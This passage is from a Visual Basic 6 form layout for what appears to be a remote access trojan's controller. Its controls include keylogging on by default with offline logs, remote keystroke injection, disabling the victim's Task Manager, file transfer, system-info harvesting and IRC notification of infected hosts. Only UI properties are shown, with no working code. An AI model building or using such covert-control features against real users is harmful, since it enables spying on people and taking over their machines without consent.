            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdUpload 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "ñ"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   15.75
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   2640
            TabIndex        =   33
            ToolTipText     =   "Upload to directory."
            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdDownload 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "ò"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   15.75
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   2040
            TabIndex        =   32
            ToolTipText     =   "Download selected file."
            Top             =   240
            Width           =   615
         End
      End
      Begin VB.Frame fmeKeyboard 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   37
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin MSComDlg.CommonDialog cdKeyLog 
            Left            =   120
            Top             =   120
            _ExtentX        =   847
            _ExtentY        =   847
            _Version        =   393216
            CancelError     =   -1  'True
            DialogTitle     =   "Save Remote|Control Keylog"
            Filter          =   "Text Files (*.txt)|*txt|Log Files (*.log)|*.log|All Files (*.*)|*.*"
         End
         Begin VB.TextBox txtTypeLive 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   120
            TabIndex        =   77
            Text            =   "CLICK IN HERE AND PRESS KEYS TO EMULATE TYPEING"
            ToolTipText     =   "When you press keys while this textbox has focus, the host computer will  'press' the same keys, simitaniously."
            Top             =   1200
            Width           =   4575
         End
         Begin VB.TextBox txtSendKeys 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   735
            Left            =   120
            MultiLine       =   -1  'True
            TabIndex        =   40
            Top             =   240
            Width           =   3375
         End
         Begin VB.TextBox txtKeyLog 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   2535
            Left            =   120
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            TabIndex        =   38
            Top             =   1920
            Width           =   4575
         End
         Begin VB.Label cmdOldLogs 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Offline Logs"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   3240
            TabIndex        =   118
            Top             =   4560
            Width           =   1455
         End
         Begin VB.Label cmdSaveKeyLog 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Save Text"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   120
            TabIndex        =   43
            Top             =   4560
            Width           =   1215
         End
         Begin VB.Label cmdClearKeyLog 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Clear Text"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   1440
            TabIndex        =   42
            Top             =   4560
            Width           =   1095
         End
         Begin VB.Label cmdSendKeys 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "               Send Keys"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   735
            Left            =   3600
            TabIndex        =   41
            Top             =   240
            Width           =   1095
         End
         Begin VB.Label lblKeyLog 
            BackStyle       =   0  'Transparent
            Caption         =   "Today's Activities:"
            Height          =   255
            Left            =   120
            TabIndex        =   39
            Top             =   1680
            Width           =   4575
         End
      End
      Begin VB.Frame fmeAbout 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   54
         Top             =   120
         Width           =   4815
         Begin VB.PictureBox picCredits 
            Appearance      =   0  'Flat
            AutoRedraw      =   -1  'True
            BackColor       =   &H00000000&
            ForeColor       =   &H80000008&
            Height          =   2175
            Left            =   0
            ScaleHeight     =   2145
            ScaleWidth      =   4785
            TabIndex        =   57
            Top             =   1440
            Width           =   4815
            Begin VB.Timer tmrCredits 
               Interval        =   1
               Left            =   0
               Top             =   0
            End
            Begin VB.Label lblCredits 
               Alignment       =   2  'Center
               BackStyle       =   0  'Transparent
               Caption         =   " Tim Cinel 2002      ( 0  ) ( 0 )                 (_)            \________/"
               BeginProperty Font 
                  Name            =   "Arial Black"
                  Size            =   9
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H00FFFFFF&
               Height          =   1095
               Left            =   720
               TabIndex        =   58
               ToolTipText     =   "sickanimations_inc@hotmail.com"
               Top             =   720
               Width           =   1575
            End
         End
         Begin VB.PictureBox PicBottom 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            ForeColor       =   &H80000008&
            Height          =   1335
            Left            =   0
            ScaleHeight     =   1305
            ScaleWidth      =   4785
            TabIndex        =   56
            Top             =   3600
            Width           =   4815
            Begin VB.Image imgBottom 
               Height          =   1200
               Left            =   120
               Picture         =   "frmMain.frx":2A1B
               Top             =   0
               Width           =   4575
            End
         End
         Begin VB.PictureBox picHead 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            FillColor       =   &H000000FF&
            ForeColor       =   &H00000000&
            Height          =   1335
            Left            =   0
            ScaleHeight     =   1305
            ScaleWidth      =   4785
            TabIndex        =   55
            Top             =   120
            Width           =   4815
            Begin VB.Image imgHead 
               Height          =   1200
               Left            =   120
               Picture         =   "frmMain.frx":854C
               Top             =   0
               Width           =   4575
            End
         End
      End
      Begin VB.Frame fmeWindows 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   44
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.TextBox txtShellPage 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   120
            TabIndex        =   149
            Top             =   4080
            Width           =   3255
         End
         Begin VB.Frame fmeWindowsTasks 
            BackColor       =   &H00808000&
            Caption         =   "Tasks"
            Height          =   1095
            Left            =   120
            TabIndex        =   48
            Top             =   2640
            Width           =   4575
            Begin VB.CheckBox Check1 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "Allow Task Manager"
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   120
               TabIndex        =   51
               ToolTipText     =   "When unchecked Windows Task Manager is disabled or remote computer on Win 95, 98, Me, Some XP computers (Not WinNT or Win2000)"
               Top             =   750
               Value           =   1  'Checked
               Width           =   4095
            End
            Begin VB.Label cmdWindowManager 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Window Manager"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   495
               Left            =   1680
               TabIndex        =   50
               ToolTipText     =   "Switch to windows, minimise windows, exit windows, change window captions on remote computer."
               Top             =   240
               Width           =   1095
            End
            Begin VB.Label cmdTaskManager 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Task Manager"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   495
               Left            =   240
               TabIndex        =   49
               ToolTipText     =   "A Ctrl+Alt+Del task manager (Windows 95, 98, Me) alike window. End Tasks and Shud Down computer."
               Top             =   240
               Width           =   1095
            End
         End
         Begin VB.Frame fmeWindowsMultimedia 
            BackColor       =   &H00808000&
            Caption         =   "Multimedia and Devices"
            Height          =   1095
            Left            =   1440
            TabIndex        =   47
            Top             =   240
            Width           =   3255
            Begin VB.Label cmdMultimediaDeviceManager 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Multimedia and Device Manager"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   495
               Left            =   720
               TabIndex        =   222
               ToolTipText     =   "Opens CD tray on remote computer."
               Top             =   360
               Width           =   1695
            End
         End
         Begin VB.Frame fmeWindowsEssentials 
            BackColor       =   &H00808000&
            Caption         =   "Essential Items"
            Height          =   1095
            Left            =   120
            TabIndex        =   45
            Top             =   1440
            Width           =   4575
            Begin VB.ComboBox cmbMethod 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   315
               ItemData        =   "frmMain.frx":E194
               Left            =   2280
               List            =   "frmMain.frx":E1A4
               Style           =   2  'Dropdown List
               TabIndex        =   53
               ToolTipText     =   "Choose shutdown method"
               Top             =   240
               Width           =   2055
            End
            Begin VB.ComboBox cmbHideShow 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   315
               ItemData        =   "frmMain.frx":E1D2
               Left            =   120
               List            =   "frmMain.frx":E1E5
               Style           =   2  'Dropdown List
               TabIndex        =   46
               ToolTipText     =   "Choose item to make visible/invisible"
               Top             =   240
               Width           =   2055
            End
            Begin VB.Label cmdHide 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Hide"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   1200
               TabIndex        =   79
               ToolTipText     =   "Opens CD tray on remote computer."
               Top             =   720
               Width           =   975
            End
            Begin VB.Label cmdShow 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Show"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   120
               TabIndex        =   78
               ToolTipText     =   "Opens CD tray on remote computer."
               Top             =   720
               Width           =   975
            End
            Begin VB.Label cmdShutDown 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Shut Down"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   2280
               TabIndex        =   52
               ToolTipText     =   "Shutdown computer using method stated in above combo box."
               Top             =   720
               Width           =   2055
            End
         End
         Begin VB.Label cmdShellPage 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Display"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   3480
            TabIndex        =   150
            Top             =   4080
            Width           =   1095
         End
         Begin VB.Label lblBrowse 
            BackStyle       =   0  'Transparent
            Caption         =   "Display Web-Page or Directory:"
            Height          =   255
            Left            =   120
            TabIndex        =   148
            Top             =   3840
            Width           =   2295
         End
         Begin VB.Image Image2 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   1065
            Left            =   120
            Picture         =   "frmMain.frx":E22C
            ToolTipText     =   "Micro$oft Windoze"
            Top             =   240
            Width           =   1230
         End
      End
      Begin VB.Frame fmeSystemInfo 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   26
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.TextBox txtInternetInfo 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   240
            TabIndex        =   182
            Top             =   4560
            Width           =   4455
         End
         Begin VB.TextBox txtAvailibleMemory 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   180
            Top             =   3360
            Width           =   1695
         End
         Begin VB.TextBox txtResolution 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   178
            Top             =   4080
            Width           =   1695
         End
         Begin VB.TextBox txtTotalMemory 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   176
            Top             =   2760
            Width           =   1695
         End
         Begin VB.TextBox txtCpuSpeed 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   174
            Top             =   2040
            Width           =   1695
         End
         Begin VB.TextBox txtCpuModel 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   172
            Top             =   1440
            Width           =   1695
         End
         Begin VB.TextBox txtCpuVendor 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            TabIndex        =   170
            Top             =   840
            Width           =   1695
         End
         Begin VB.TextBox txtProductId 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   168
            Top             =   3600
            Width           =   1215
         End
         Begin VB.TextBox txtOrganization 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   166
            Top             =   3240
            Width           =   1215
         End
         Begin VB.TextBox txtOwner 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   164
            Top             =   2880
            Width           =   1215
         End
         Begin VB.TextBox txtUptime 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   162
            Top             =   2520
            Width           =   1215
         End
         Begin VB.TextBox txtWindowsVersion 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   160
            Top             =   2160
            Width           =   1215
         End
         Begin VB.TextBox txtCountry 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   158
            Top             =   1680
            Width           =   1215
         End
         Begin VB.TextBox txtLocalTime 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   156
            Top             =   1320
            Width           =   1215
         End
         Begin VB.TextBox txtUser 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   154
            Top             =   960
            Width           =   1215
         End
         Begin VB.TextBox txtComputerName 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1560
            TabIndex        =   152
            Top             =   550
            Width           =   1215
         End
         Begin VB.Label lblInternetInfo 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Internet Information:"
            Height          =   255
            Left            =   120
            TabIndex        =   181
            Top             =   4320
            Width           =   1455
         End
         Begin VB.Label lblAvailibleMemory 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Availible Physical Memory"
            Height          =   255
            Left            =   2880
            TabIndex        =   179
            Top             =   3120
            Width           =   1815
         End
         Begin VB.Label lblResolution 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Moniter Resolution:"
            Height          =   255
            Left            =   2880
            TabIndex        =   177
            Top             =   3840
            Width           =   1815
         End
         Begin VB.Label lblTotalMemory 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Total Physical Memory:"
            Height          =   255
            Left            =   2880
            TabIndex        =   175
            Top             =   2520
            Width           =   1815
         End
         Begin VB.Label lblCpuSpeed 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Processor Speed:"
            Height          =   255
            Left            =   2880
            TabIndex        =   173
            Top             =   1800
            Width           =   1335
         End
         Begin VB.Label lblCpuModel 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Processor Model:"
            Height          =   255
            Left            =   2880
            TabIndex        =   171
            Top             =   1200
            Width           =   1335
         End
         Begin VB.Label lblCpuVendor 
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Processor Vendor:"
            Height          =   255
            Left            =   2880
            TabIndex        =   169
            Top             =   600
            Width           =   1335
         End
         Begin VB.Label lblProductId 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   " Product ID"
            Height          =   255
            Left            =   240
            TabIndex        =   167
            Top             =   3600
            Width           =   1215
         End
         Begin VB.Label lblOrganization 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Organization"
            Height          =   255
            Left            =   240
            TabIndex        =   165
            Top             =   3240
            Width           =   1215
         End
         Begin VB.Label lblOwner 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Windows Owner"
            Height          =   255
            Left            =   240
            TabIndex        =   163
            Top             =   2880
            Width           =   1215
         End
         Begin VB.Label lblUptime 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Windows Uptime"
            Height          =   255
            Left            =   240
            TabIndex        =   161
            Top             =   2550
            Width           =   1215
         End
         Begin VB.Label lblWindowsVersion 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Windows Version"
            Height          =   255
            Left            =   120
            TabIndex        =   159
            Top             =   2205
            Width           =   1335
         End
         Begin VB.Label lblCountry 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Specified Country"
            Height          =   255
            Left            =   120
            TabIndex        =   157
            Top             =   1725
            Width           =   1335
         End
         Begin VB.Label lblLocalTime 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Local Time"
            Height          =   255
            Left            =   120
            TabIndex        =   155
            Top             =   1365
            Width           =   1335
         End
         Begin VB.Label lblUser 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Current User"
            Height          =   255
            Left            =   120
            TabIndex        =   153
            Top             =   1005
            Width           =   1335
         End
         Begin VB.Label lblComputerName 
            Alignment       =   1  'Right Justify
            BackColor       =   &H00808000&
            BackStyle       =   0  'Transparent
            Caption         =   "Computer Name"
            Height          =   255
            Left            =   120
            TabIndex        =   151
            Top             =   600
            Width           =   1335
         End
         Begin VB.Label cmdRequestSystemInfo 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Request Info"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   120
            TabIndex        =   29
            Top             =   240
            Width           =   4575
         End
      End
      Begin VB.Frame fmeConnection 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   4935
         Left            =   2280
         TabIndex        =   14
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.TextBox txtUpgradePath 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1320
            TabIndex        =   145
            Top             =   3600
            Width           =   2295
         End
         Begin VB.Frame fmeSettings 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            Caption         =   "Settings"
            ForeColor       =   &H80000008&
            Height          =   2415
            Left            =   120
            TabIndex        =   136
            Top             =   1080
            Width           =   4575
            Begin VB.CheckBox chkAutoConnect 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "AutoConnect"
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   840
               TabIndex        =   218
               Top             =   600
               Width           =   1335
            End
            Begin VB.TextBox txtIrcOwner 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   3480
               TabIndex        =   203
               Top             =   1320
               Width           =   855
            End
            Begin VB.TextBox txtACPort 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   3480
               TabIndex        =   202
               Top             =   1080
               Width           =   855
            End
            Begin VB.TextBox txtACHost 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   3480
               TabIndex        =   201
               Top             =   840
               Width           =   855
            End
            Begin VB.TextBox txtAcceptPort 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   3480
               TabIndex        =   200
               Top             =   600
               Width           =   855
            End
            Begin VB.CheckBox chkAccept 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "Accept Connections"
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   2400
               TabIndex        =   198
               Top             =   240
               Width           =   2055
            End
            Begin VB.TextBox txtIrcEmail 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1080
               TabIndex        =   192
               Top             =   2040
               Width           =   975
            End
            Begin VB.TextBox txtIrcName 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1080
               TabIndex        =   191
               Top             =   1800
               Width           =   975
            End
            Begin VB.CheckBox chkBouncer 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "Bouncer"
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   1320
               TabIndex        =   184
               Top             =   240
               Value           =   1  'Checked
               Width           =   975
            End
            Begin VB.CheckBox chkKeylogger 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "Keylogging "
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   120
               TabIndex        =   146
               Top             =   240
               Value           =   1  'Checked
               Width           =   1095
            End
            Begin VB.TextBox txtIrcNick 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1080
               TabIndex        =   143
               Top             =   1560
               Width           =   975
            End
            Begin VB.TextBox txtIrcPort 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1080
               TabIndex        =   142
               Top             =   1320
               Width           =   975
            End
            Begin VB.TextBox txtIrcServer 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1080
               TabIndex        =   141
               Top             =   1080
               Width           =   975
            End
            Begin VB.CheckBox chkIrcNotify 
               Appearance      =   0  'Flat
               BackColor       =   &H00808000&
               Caption         =   "IRC"
               ForeColor       =   &H80000008&
               Height          =   255
               Left            =   120
               TabIndex        =   140
               Top             =   600
               Value           =   1  'Checked
               Width           =   615
            End
            Begin VB.Label lblListenOn 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Owner:"
               Height          =   255
               Index           =   4
               Left            =   2160
               TabIndex        =   206
               Top             =   1320
               Width           =   1215
            End
            Begin VB.Label lblListenOn 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "AC Port:"
               Height          =   255
               Index           =   3
               Left            =   2160
               TabIndex        =   205
               Top             =   1080
               Width           =   1215
            End
            Begin VB.Label lblListenOn 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "AC Host:"
               Height          =   255
               Index           =   2
               Left            =   2160
               TabIndex        =   204
               Top             =   840
               Width           =   1215
            End
            Begin VB.Label lblListenOn 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "Listen on Port:"
               Height          =   255
               Index           =   1
               Left            =   2160
               TabIndex        =   199
               Top             =   600
               Width           =   1215
            End
            Begin VB.Label lblIrcEmail 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Email:"
               Height          =   255
               Left            =   120
               TabIndex        =   194
               Top             =   2040
               Width           =   855
            End
            Begin VB.Label lblIrcName 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Name:"
               Height          =   255
               Left            =   120
               TabIndex        =   193
               Top             =   1800
               Width           =   855
            End
            Begin VB.Label cmdServerLoad 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Server Load Settings"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   2160
               TabIndex        =   190
               Top             =   1800
               Width           =   2295
            End
            Begin VB.Label cmdLoadSettings 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Load"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   3360
               TabIndex        =   185
               Top             =   2040
               Width           =   1095
            End
            Begin VB.Label cmdSaveSettings 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Save"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   2160
               TabIndex        =   183
               Top             =   2040
               Width           =   1095
            End
            Begin VB.Label lblIrcNick 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Nick:"
               Height          =   255
               Left            =   120
               TabIndex        =   139
               Top             =   1560
               Width           =   855
            End
            Begin VB.Label lblIrcPort 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Port:"
               Height          =   255
               Left            =   120
               TabIndex        =   138
               Top             =   1320
               Width           =   855
            End
            Begin VB.Label lblIrcServer 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "IRC Server:"
               Height          =   255
               Left            =   120
               TabIndex        =   137
               Top             =   1080
               Width           =   855
            End
         End
         Begin VB.TextBox txtLog 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   855
            Left            =   240
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            TabIndex        =   81
            Text            =   "frmMain.frx":1231E
            Top             =   3960
            Width           =   4335
         End
         Begin VB.Timer tmrConnectionTime 
            Enabled         =   0   'False
            Interval        =   1000
            Left            =   0
            Top             =   0
         End
         Begin VB.TextBox txtBytesReceived 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1200
            Locked          =   -1  'True
